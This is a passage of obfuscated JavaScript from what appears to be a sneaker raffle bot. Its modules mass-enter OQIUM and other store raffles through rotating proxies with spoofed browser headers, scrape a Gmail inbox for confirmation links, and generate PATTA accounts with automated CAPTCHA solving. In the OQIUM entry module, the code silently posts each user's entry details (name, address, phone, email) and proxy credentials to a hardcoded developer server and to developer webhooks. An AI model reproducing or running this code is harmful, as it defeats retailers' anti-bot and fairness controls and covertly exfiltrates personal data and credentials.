                                    else {
                                        var _0x16f121 = _0x3e271f['seq']['fetch'](_0x466396, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x16f121['on']('message', function (_0x3c0639, _0xbb462c) {
                                            var _0x228ac5 = '(#' + _0xbb462c + ')\x20';
                                            _0x3c0639['on']('body', function (_0x50177d, _0x33331a) {
                                                _0x1560b8(_0x50177d, (_0x4e50f2, _0x205148) => {
                                                    var _0x26a875 = _0x205148['text']['split']('(')[0x1], _0x4f5362 = _0x26a875['split'](')')[0x0];
                                                    _0x1aa3ea['push'](_0x4f5362);
                                                });
                                            }), _0x3c0639['once']('end', function () {
                                            });
                                        }), _0x16f121['once']('error', function (_0x4e122e) {
                                            console['log']('Fetch\x20error:\x20' + _0x4e122e), _0x363250 = !![];
                                        }), _0x16f121['once']('end', function () {
                                            _0x3e271f['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3e271f['once']('error', function (_0x390da4) {
                            console['log'](_0x31f5da['red'](_0x390da4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x363250 = !![];
                        }), _0x3e271f['once']('end', async function () {
                            _0x363250 = !![];
                        }), _0x3e271f['connect']();
                    }
                    async function _0x4d81a5(_0x353068, _0x1881e2, _0x2cfca4) {
                        for (var _0x1777ec = 0x0; _0x1777ec < _0x1881e2['length']; _0x1777ec++) {
                            async function _0x32f8f2(_0x46c61c, _0x1bacc4, _0x3eb9e6, _0x55ed64, _0x10dfbe) {
                                var _0x322406, _0x2325b0 = {}, _0xa069ae = [], _0x1227d4 = {}, _0x42446c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3809fd = Math['round'](Math['random']() * (_0x42446c['length'] - 0x1));
                                _0x55ed64[_0x46c61c]['Size'] == 'RANDOM' && (_0x55ed64[_0x46c61c]['Size'] = _0x42446c[_0x3809fd]);
                                !_0x55ed64 && (_0x55ed64 = {});
                                if (_0x4558f2['useRandomProxy'] = ![])
                                    var _0x38ef46 = _0x10dfbe[_0x46c61c]['split'](':');
                                else
                                    var _0x3a538d = Math['round'](Math['random']() * (_0x10dfbe['length'] - 0x1)), _0x38ef46 = _0x10dfbe[_0x3a538d]['split'](':');
                                var _0x26c0b9 = {
                                    'jar': _0x149879,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3eb9e6['url'],
                                    'headers': _0x3eb9e6['headers'],
                                    'body': JSON['stringify'](_0x2325b0),
                                    'proxy': 'http://' + _0x38ef46[0x2] + ':' + _0x38ef46[0x3] + '@' + _0x38ef46[0x0] + ':' + _0x38ef46[0x1]
                                };
                                return _0x1bacc4 != 'ver' && (_0x26c0b9['url'] = _0x3eb9e6['url'], _0x26c0b9['headers'] = _0x3eb9e6['headers']), _0x1bacc4 == 'ver' && (_0x26c0b9['method'] = 'GET', _0x26c0b9['url'] = _0x55ed64[_0x46c61c]), new Promise(function (_0x8ac45c, _0x456700) {
                                    callback = async (_0xd796c5, _0x11519d, _0x55f563) => {
                                        if (!_0xd796c5 && _0x11519d['statusCode'] == 0xca || !_0xd796c5 && _0x11519d['statusCode'] == 0xc8) {
                                            if (_0x1bacc4 != 'ver') {
                                                var _0x48985a = await _0x3d56af(_0x55ed64[_0x46c61c], _0x3eb9e6, 'dev', ![]), _0x26d1b2 = await _0x3d56af(_0x55ed64[_0x46c61c], _0x3eb9e6, 'pub', ![]);
                                                const _0x326960 = {
                                                    'succesDEVMSG': { 'embeds': [_0x48985a] },
                                                    'succesPUBMSG': { 'embeds': [_0x26d1b2] }
                                                };
                                                if (_0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '')
                                                    try {
                                                        await _0xa0452b(_0x4558f2['webhook'], _0x326960['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x326960['succesDEVMSG']), await _0x1e21d2(0xc8);
                                                try {
                                                    await _0xa0452b(_0x28ff05, _0x326960['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x406375(_0x55ed64[_0x46c61c], _0x3eb9e6);
                                            }
                                            _0x8ac45c(console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x3eb9e6['name'] + ']\x20Task\x20' + (_0x46c61c + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1bacc4 != 'ver') {
                                                var _0x280e37 = '' + _0xd796c5, _0x1606da = await _0x3d56af(_0x55ed64[_0x46c61c], _0x3eb9e6, 'dev', !![], _0x280e37), _0x4a1ead = {};
                                                _0x4a1ead['errorDEV'] = { 'embeds': [_0x1606da] }, _0x456859(_0x55ed64[_0x46c61c], _0x3eb9e6), _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x4a1ead['errorDEV']), await _0xa0452b(_0x5522d1, _0x4a1ead['errorDEV']);
                                            }
                                            _0x456700(console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x3eb9e6['name'] + ']\x20Task\x20' + (_0x46c61c + 0x1) + ':\x20' + _0xd796c5)));
                                        }
                                    };
                                    try {
                                        _0x1bacc4 != 'ver' ? console['log'](_0x1a8584() + '\x20[' + _0x3eb9e6['name'] + ']\x20Task\x20' + (_0x46c61c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2325b0['data']['attributes']['email']) : console['log'](_0x1a8584() + '\x20[' + _0x3eb9e6['name'] + ']\x20Task\x20' + (_0x46c61c + 0x1) + ':\x20Fetching\x20Response'), _0x33a47f(_0x26c0b9, callback);
                                    } catch (_0x5719a4) {
                                        console['log'](_0x1a8584() + '\x20Task\x20' + (_0x46c61c + 0x1) + ':\x20' + _0x5719a4);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x32f8f2(_0x1777ec, 'ver', _0x353068, _0x1881e2, _0x2cfca4), console['log'](_0x1a8584() + '\x20[' + _0x353068['name'] + ']\x20Sleeping\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                            } catch (_0x5e95ad) {
                            }
                        }
                    }
                    try {
                        _0x19af6b();
                        while (!_0x363250) {
                            await _0x1e21d2(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1aa3ea['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1e21d2(0x9c4);
                    }
                    await _0x4d81a5(_0x2a8657, _0x1aa3ea, _0x116c1b);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'Yp5jac',
                            'custom_source': 'FD2565-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'W4QTqQ',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x730fd1, _0x585e2a, _0x877c2c) {
                    var _0x3c4e7e = _0x585e2a, _0x250f98 = 0x0;
                    for (var _0xb55f7d = 0x0; _0xb55f7d < _0x585e2a['length']; _0xb55f7d++) {
                        maxTasks = _0x4558f2['threads'];
                        while (_0x250f98 >= maxTasks) {
                            await _0x1e21d2(_0x4558f2['delay']);
                        }
                        async function _0x3878a9(_0x38e38e, _0xd972d2, _0x3db08a, _0x2fd292) {
                            try {
                                await _0x437e8(_0xd972d2, _0x2fd292);
                            } catch (_0x148e1b) {
                                throw new Error(_0x148e1b);
                            }
                            async function _0x139d96(_0x1107c5, _0x2aaaf6, _0x2bd513, _0x3bc931, _0x272331) {
                                _0x250f98++;
                                var _0x271b2d, _0x39b89c = {}, _0x817fee = [], _0x45d45c = {}, _0x36cc69 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x1eac85 = Math['round'](Math['random']() * (_0x36cc69['length'] - 0x1));
                                !_0x3bc931 && (_0x3bc931 = {});
                                if (_0x2aaaf6 != 'ver') {
                                    _0x4a5c1f(_0x2bd513['name'] + '\x20Task\x20' + (_0x1107c5 + 0x1) + '\x20/\x20' + _0x3bc931['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40), _0x817fee = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0xf4f7bc
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x3bc931[_0x1107c5]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x4558f2['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x2bc61f
                                            }
                                        ]
                                    }], _0x45d45c = { 'embeds': _0x817fee }, _0x39b89c = _0x2bd513['data'], _0x39b89c['data']['attributes']['email'] = '' + _0x3bc931[_0x1107c5]['Email'];
                                    if (_0x3bc931[_0x1107c5]['Size'] == 'RANDOM') {
                                    }
                                    _0x39b89c['data']['attributes']['properties']['$first_name'] = '' + _0x3bc931[_0x1107c5]['FirstName'], _0x39b89c['data']['attributes']['properties']['$last_name'] = '' + _0x3bc931[_0x1107c5]['LastName'], _0x39b89c['data']['attributes']['properties']['$address1'] = _0x3bc931[_0x1107c5]['Address1'] + '\x20' + _0x3bc931[_0x1107c5]['Address2'] + '\x20' + _0x3bc931[_0x1107c5]['HouseNumber'], _0x39b89c['data']['attributes']['properties']['$zip'] = '' + _0x3bc931[_0x1107c5]['Zip'], _0x39b89c['data']['attributes']['properties']['$city'] = '' + _0x3bc931[_0x1107c5]['City'], _0x39b89c['data']['attributes']['properties']['$country'] = '' + _0x3bc931[_0x1107c5]['Country'], _0x3bc931[_0x1107c5]['Size'] == 'RANDOM' ? _0x39b89c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x36cc69[_0x1eac85] : _0x39b89c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3bc931[_0x1107c5]['Size'], _0x39b89c['data']['attributes']['properties']['$phone_number'] = '' + _0x3bc931[_0x1107c5]['Phone'], _0x39b89c['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3bc931[_0x1107c5]['Follower'];
                                }
                                if (_0x4558f2['useRandomProxy'] = ![])
                                    var _0x27959d = _0x272331[_0x1107c5]['split'](':');
                                else
                                    var _0x4ea831 = Math['round'](Math['random']() * (_0x272331['length'] - 0x1)), _0x27959d = _0x272331[_0x4ea831]['split'](':');
                                var _0xf0ceab = {
                                    'jar': _0x149879,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2bd513['url'],
                                    'headers': _0x2bd513['headers'],
                                    'body': JSON['stringify'](_0x39b89c),
                                    'proxy': 'http://' + _0x27959d[0x2] + ':' + _0x27959d[0x3] + '@' + _0x27959d[0x0] + ':' + _0x27959d[0x1]
                                };
                                return _0x2aaaf6 != 'ver' && (_0xf0ceab['url'] = _0x2bd513['url'], _0xf0ceab['headers'] = _0x2bd513['headers']), _0x2aaaf6 == 'ver' && (_0xf0ceab['method'] = 'GET'), new Promise(function (_0x37196e, _0xbadf6a) {
                                    callback = async (_0x57f83e, _0x369352, _0x3eb158) => {
                                        if (!_0x57f83e && _0x369352['statusCode'] == 0xca || !_0x57f83e && _0x369352['statusCode'] == 0xc8) {
                                            if (_0x2aaaf6 != 'ver') {
                                                var _0x29c5c0 = await _0x3d56af(_0x3bc931[_0x1107c5], _0x2bd513, 'dev', ![]), _0x4ed235 = await _0x3d56af(_0x3bc931[_0x1107c5], _0x2bd513, 'pub', ![]);
                                                const _0x2edd5e = {
                                                    'succesDEVMSG': { 'embeds': [_0x29c5c0] },
                                                    'succesPUBMSG': { 'embeds': [_0x4ed235] }
                                                };
                                                let _0x4e68e6 = _0x3bc931[_0x1107c5];
                                                try {
                                                    prxdata = {
                                                        'username': _0xf4f7bc['replace']('#', ''),
                                                        'module': _0x2bd513['name'],
                                                        'entrydata': JSON['stringify'](_0x4e68e6),
                                                        'proxy': '' + _0x272331[_0x1107c5]
                                                    };
                                                    var _0x50bd7d = JSON['stringify'](prxdata);
                                                    let _0x5a0fa8 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x50bd7d, _0x5a0fa8);
                                                } catch (_0x56f8d3) {
                                                }
                                                if (_0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '')
                                                    try {
                                                        await _0xa0452b(_0x4558f2['webhook'], _0x2edd5e['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x2edd5e['succesDEVMSG']), await _0x1e21d2(0xc8);
                                                try {
                                                    await _0xa0452b(_0x28ff05, _0x2edd5e['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x406375(_0x3bc931[_0x1107c5], _0x2bd513);
                                            }
                                            _0x250f98--, _0x37196e(console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x2bd513['name'] + ']\x20Task\x20' + (_0x1107c5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2aaaf6 != 'ver') {
                                                var _0x22128e = '' + _0x57f83e, _0x393acb = await _0x3d56af(_0x3bc931[_0x1107c5], _0x2bd513, 'dev', !![], _0x22128e), _0x272110 = {};
                                                _0x272110['errorDEV'] = { 'embeds': [_0x393acb] }, _0x456859(_0x3bc931[_0x1107c5], _0x2bd513), _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x272110['errorDEV']), await _0xa0452b(_0x5522d1, _0x272110['errorDEV']);
                                            }
                                            _0x250f98--, _0xbadf6a(console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x2bd513['name'] + ']\x20Task\x20' + (_0x1107c5 + 0x1) + ':\x20' + _0x57f83e)));
                                        }
                                    };
                                    try {
                                        _0x2aaaf6 != 'ver' && console['log'](_0x1a8584() + '\x20[' + _0x2bd513['name'] + ']\x20Task\x20' + (_0x1107c5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x39b89c['data']['attributes']['email']), _0x33a47f(_0xf0ceab, callback);
                                    } catch (_0x38c932) {
                                        console['log'](_0x1a8584() + '\x20Task\x20' + (_0x1107c5 + 0x1) + ':\x20' + _0x38c932);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x139d96(_0x2fd292, 'nor', _0x38e38e, _0xd972d2, _0x3db08a), console['log'](_0x1a8584() + '\x20[' + _0x38e38e['name'] + ']\x20Sleeping\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                            } catch (_0x1a1b76) {
                            }
                        }
                        _0x3878a9(_0x730fd1, _0x3c4e7e, _0x877c2c, _0xb55f7d), await _0x1e21d2(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1da5dd, _0x1255c0, _0x2e37bc) {
                    var _0x1255c0 = [], _0x180f5b = ![];
                    async function _0x4ecfa3() {
                        var _0x3f3aff = new _0x48412a({
                            'user': _0x4558f2['masterMail'],
                            'password': _0x4558f2['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3d85f0(_0x459a4f) {
                            _0x3f3aff['openBox']('INBOX', ![], _0x459a4f);
                        }
                        _0x3f3aff['once']('ready', function () {
                            _0x3d85f0(function (_0x50430b, _0x2b3a4d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x50430b)
                                    throw _0x50430b;
                                _0x3f3aff['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x5b5424, _0xc05b6) {
                                    if (!_0xc05b6 || !_0xc05b6['length'])
                                        console['log'](_0x1a8584() + '\x20[' + _0x1da5dd['name'] + ']\x20No\x20mails\x20found'), _0x3f3aff['end']();
                                    else {
                                        var _0x2cf229 = _0x3f3aff['seq']['fetch'](_0xc05b6, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2cf229['on']('message', function (_0x478744, _0xfe4f8f) {
                                            var _0x93a807 = '(#' + _0xfe4f8f + ')\x20';
                                            _0x478744['on']('body', function (_0x2b6b9, _0x3c7027) {
                                                _0x1560b8(_0x2b6b9, (_0x482fd7, _0x3b0055) => {
                                                    var _0x5a23c0 = _0x3b0055['text']['split']('(')[0x1], _0x5cb551 = _0x5a23c0['split'](')')[0x0];
                                                    _0x1255c0['push'](_0x5cb551);
                                                });
                                            }), _0x478744['once']('end', function () {
                                            });
                                        }), _0x2cf229['once']('error', function (_0x1ab523) {
                                            console['log']('Fetch\x20error:\x20' + _0x1ab523), _0x180f5b = !![];
                                        }), _0x2cf229['once']('end', function () {
                                            _0x3f3aff['end'](), _0x180f5b = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x3f3aff['once']('error', function (_0x306d6f) {
                            console['log'](_0x306d6f), _0x180f5b = !![];
                        }), _0x3f3aff['once']('end', async function () {
                            _0x180f5b = !![];
                        }), _0x3f3aff['connect']();
                    }
                    async function _0x276623(_0x31af28, _0x2d9926, _0x5ab89b) {
                        for (var _0x2a4b99 = 0x0; _0x2a4b99 < _0x2d9926['length']; _0x2a4b99++) {
                            async function _0x561e59(_0x83ff19, _0x5968c4, _0x43a286, _0x57e5d5, _0x54cc30) {
                                var _0x5ee98a, _0x46f1cf = {}, _0x276c1e = [], _0x255c07 = {}, _0x11bb0b = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x30c67a = Math['round'](Math['random']() * (_0x11bb0b['length'] - 0x1));
                                _0x57e5d5[_0x83ff19]['Size'] == 'RANDOM' && (_0x57e5d5[_0x83ff19]['Size'] = _0x11bb0b[_0x30c67a]);
                                !_0x57e5d5 && (_0x57e5d5 = {});
                                if (_0x4558f2['useRandomProxy'] = ![])
                                    var _0x15de33 = _0x54cc30[_0x83ff19]['split'](':');
                                else
                                    var _0x411cb0 = Math['round'](Math['random']() * (_0x54cc30['length'] - 0x1)), _0x15de33 = _0x54cc30[_0x411cb0]['split'](':');
                                var _0x10eb02 = {
                                    'jar': _0x149879,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x43a286['url'],
                                    'headers': _0x43a286['headers'],
                                    'body': JSON['stringify'](_0x46f1cf),
                                    'proxy': 'http://' + _0x15de33[0x2] + ':' + _0x15de33[0x3] + '@' + _0x15de33[0x0] + ':' + _0x15de33[0x1]
                                };
                                return _0x5968c4 == 'ver' && (_0x10eb02['method'] = 'GET', _0x10eb02['url'] = _0x57e5d5[_0x83ff19]), new Promise(function (_0xa16459, _0x1cf04a) {
                                    callback = async (_0x1096f0, _0x161a74, _0x20857c) => {
                                        !_0x1096f0 && _0x161a74['statusCode'] == 0xca || !_0x1096f0 && _0x161a74['statusCode'] == 0xc8 ? _0xa16459(console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x43a286['name'] + ']\x20Task\x20' + (_0x83ff19 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x1cf04a(console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x43a286['name'] + ']\x20Task\x20' + (_0x83ff19 + 0x1) + ':\x20' + _0x1096f0)));
                                    };
                                    try {
                                        _0x5968c4 != 'ver' ? console['log'](_0x1a8584() + '\x20[' + _0x43a286['name'] + ']\x20Task\x20' + (_0x83ff19 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x46f1cf['data']['attributes']['email']) : console['log'](_0x1a8584() + '\x20[' + _0x43a286['name'] + ']\x20Task\x20' + (_0x83ff19 + 0x1) + ':\x20Fetching\x20Response'), _0x33a47f(_0x10eb02, callback);
                                    } catch (_0x47c029) {
                                        console['log'](_0x1a8584() + '\x20Task\x20' + (_0x83ff19 + 0x1) + ':\x20' + _0x47c029);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x561e59(_0x2a4b99, 'ver', _0x31af28, _0x2d9926, _0x5ab89b), console['log'](_0x1a8584() + '\x20[' + _0x31af28['name'] + ']\x20Sleeping\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                            } catch (_0x6fbc46) {
                                console['log'](_0x6fbc46), await _0x1e21d2(0x2710);
                            }
                        }
                    }
                    try {
                        _0x4ecfa3();
                        while (!_0x180f5b) {
                            await _0x1e21d2(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1255c0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0xfabd5a) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0xfabd5a), await _0x1e21d2(0x2710);
                    }
                    try {
                        await _0x276623(_0x1da5dd, _0x1255c0, _0x2e37bc);
                    } catch (_0x148cf4) {
                        console['log'](_0x148cf4), await _0x1e21d2(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x185b6d, _0x9d82fb, _0x115019) {
                    _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4558f2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x52e28f = 0x0; _0x52e28f < _0x9d82fb['length']; _0x52e28f++) {
                        var _0x5793ce = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xf4f7bc
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4558f2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2bc61f
                                }
                            ]
                        }];
                        const _0x968f86 = { 'embeds': _0x5793ce };
                        _0x4a5c1f(_0x185b6d['name'] + '\x20Task\x20' + (_0x52e28f + 0x1) + '\x20/\x20' + _0x9d82fb['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                        try {
                            await _0x437e8(_0x9d82fb, _0x52e28f);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x210df0 = await _0x3d56af(_0x9d82fb[_0x52e28f], _0x185b6d, 'acc', ![]);
                        const _0x333956 = { 'succesDEVMSG': { 'embeds': [_0x210df0] } };
                        if (_0x9d82fb[_0x52e28f]['Email'] == '' || _0x9d82fb[_0x52e28f]['FirstName'] == '' || _0x9d82fb[_0x52e28f]['LastName'] == '') {
                            console['log'](_0x1a8584() + '\x20[' + _0x5f2e49[taskModule]['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1e21d2(0x7d0);
                            continue;
                        }
                        (_0x9d82fb[_0x52e28f]['Password'] == '' || _0x9d82fb[_0x52e28f] == undefined) && _0x9d82fb[_0x52e28f]['Password'] == 'JRaffles23!';
                        if (_0x4558f2['useRandomProxy'] = ![])
                            var _0x4242ee = _0x115019[_0x52e28f]['split'](':');
                        else
                            var _0x2c61bd = Math['round'](Math['random']() * (_0x115019['length'] - 0x1)), _0x4242ee = _0x115019[_0x2c61bd]['split'](':');
                        var _0x4b267d;
                        try {
                            _0x4b267d = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4242ee[0x0] + ':' + _0x4242ee[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b267d = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4242ee[0x0] + ':' + _0x4242ee[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x28a54c = await _0x4b267d['newPage']();
                            await _0x28a54c['authenticate']({
                                'username': '' + _0x4242ee[0x2],
                                'password': '' + _0x4242ee[0x3]
                            }), console['log'](_0x1a8584() + '\x20[' + _0x185b6d['name'] + ']\x20Task\x20' + (_0x52e28f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x28a54c['setRequestInterception'](!![]), _0x28a54c['on']('request', _0xa82bf3 => {
                                _0xa82bf3['resourceType']() === 'image' || _0xa82bf3['resourceType']() === 'font' || _0xa82bf3['resourceType']() === 'media' ? _0xa82bf3['abort']() : _0xa82bf3['continue']();
